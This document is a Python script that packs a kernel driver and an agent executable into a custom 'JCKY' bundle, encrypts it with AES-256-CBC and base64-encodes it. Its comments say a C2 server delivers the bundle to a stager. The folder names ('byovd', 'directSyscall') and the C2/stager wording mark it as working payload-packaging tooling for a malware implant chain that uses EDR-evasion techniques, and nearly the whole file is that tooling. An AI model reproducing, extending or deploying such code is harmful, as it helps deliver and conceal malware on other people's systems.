#!/usr/bin/env python3
# build_bundle.py
# Packages driver.sys + jocky_agent.exe into the JCKY bundle format,
# AES-256-CBC encrypts it, base64 encodes it, and writes bundle.bin.
#
# Usage:
#   python build_bundle.py
#   python build_bundle.py path/to/driver.sys path/to/jocky_agent.exe path/to/out.bin
#
# Reads JOCKY_AES_KEY from endpoint-management-server/.env automatically.
# Requires: pip install pycryptodome

import struct
import sys
import os
import base64

def load_env(path=".env"):
    env = {}
    try:
        with open(path) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#") or "=" not in line:
                    continue
                k, v = line.split("=", 1)
                env[k.strip()] = v.strip()
    except FileNotFoundError:
        pass
    return env

MAGIC   = b"JCKY"
VERSION = 0x01

TYPE_DRIVER = 0x01
TYPE_AGENT  = 0x04

# BundleHeader: magic(4) + version(1) + num_files(1) + reserved(10) = 16 bytes
HEADER_SIZE = 16
# BundleEntry:  type(1)  + size(4)   + offset(8)                    = 13 bytes
ENTRY_SIZE  = 13

def build_bundle(driver_path, agent_path, out_path, aes_key_bytes):
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    from Crypto.Random import get_random_bytes

    driver_data = open(driver_path, "rb").read()
    agent_data  = open(agent_path,  "rb").read()

    files = [
        (TYPE_DRIVER, driver_data),
        (TYPE_AGENT,  agent_data),
    ]
    num_files = len(files)

    # Header
    header = MAGIC + struct.pack("BB", VERSION, num_files) + b'\x00' * 10

    # File table — offsets are absolute into the plaintext bundle buffer
    table_size = num_files * ENTRY_SIZE
    data_start = HEADER_SIZE + table_size  # 16 + 2*13 = 42

    table = b""
    data  = b""
    offset = data_start

    for ftype, fdata in files:
        # <BIQ = little-endian: uint8, uint32, uint64
        table += struct.pack("<BIQ", ftype, len(fdata), offset)
        data  += fdata
        offset += len(fdata)

    plaintext = header + table + data

    # AES-256-CBC: prepend random IV (matches stager decrypt convention)
    iv         = get_random_bytes(16)
    cipher     = AES.new(aes_key_bytes, AES.MODE_CBC, iv)
    ciphertext = iv + cipher.encrypt(pad(plaintext, AES.block_size))

    # Base64 encode (C2 serves as text; stager base64-decodes before AES-decrypt)
    encoded = base64.b64encode(ciphertext)

    with open(out_path, "wb") as f:
        f.write(encoded)

    names = {TYPE_DRIVER: "driver.sys", TYPE_AGENT: "jocky_agent.exe"}
    print(f"[+] Bundle built successfully")
    print(f"    Plaintext:  {len(plaintext):,} bytes")
    print(f"    Encrypted:  {len(ciphertext):,} bytes")
    print(f"    Encoded:    {len(encoded):,} bytes  → {out_path}")
    print(f"[+] Components:")
    cur = data_start
    for ftype, fdata in files:
        print(f"    {names[ftype]:<16} {len(fdata):>8,} bytes  (offset {cur})")
        cur += len(fdata)

def main():
    # Defaults
    driver_path = "byovd/driver/driver.sys"
    agent_path  = "directSyscall/jocky_agent.exe"
    out_path    = "bundle.bin"

    if len(sys.argv) == 4:
        driver_path, agent_path, out_path = sys.argv[1], sys.argv[2], sys.argv[3]
    elif len(sys.argv) != 1:
        print("Usage: python build_bundle.py [driver.sys jocky_agent.exe out.bin]")
        sys.exit(1)

    # Load AES key from .env
    env = load_env("endpoint-management-server/.env")
    key_hex = env.get("JOCKY_AES_KEY") or os.environ.get("JOCKY_AES_KEY", "")
    if not key_hex:
        print("[-] JOCKY_AES_KEY not found in endpoint-management-server/.env")
        sys.exit(1)
    if len(key_hex) != 64:
        print(f"[-] JOCKY_AES_KEY must be 64 hex chars, got {len(key_hex)}")
        sys.exit(1)
    aes_key = bytes.fromhex(key_hex)

    for path in (driver_path, agent_path):
        if not os.path.exists(path):
            print(f"[-] Not found: {path}")
            sys.exit(1)

    try:
        build_bundle(driver_path, agent_path, out_path, aes_key)
    except ImportError:
        print("[-] Missing dependency: pip install pycryptodome")
        sys.exit(1)

if __name__ == "__main__":
    main()
